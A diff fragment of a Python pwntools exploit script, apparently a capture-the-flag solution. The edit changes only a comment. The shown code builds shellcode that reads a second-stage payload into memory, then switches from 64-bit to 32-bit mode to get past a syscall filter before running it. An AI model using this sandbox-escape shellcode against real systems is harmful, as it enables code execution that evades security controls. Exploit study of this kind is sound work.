@@ -8,7 +8,7 @@ s.bind((host, port))        # Ket noi toi port
 shellcode =''
 # read shellcode
 shellcode += asm(shellcraft.amd64.linux.read(fd=0, buffer=0x40000, count=0x500))
-# convert from x64 to x86 and execute shellcode at 0x40000
+# convert from x64 to x86 to bypass filter syscall and execute shellcode at 0x40000
 shellcode += asm("""
 	xor rsp, rsp
 	mov esp, 0x40500
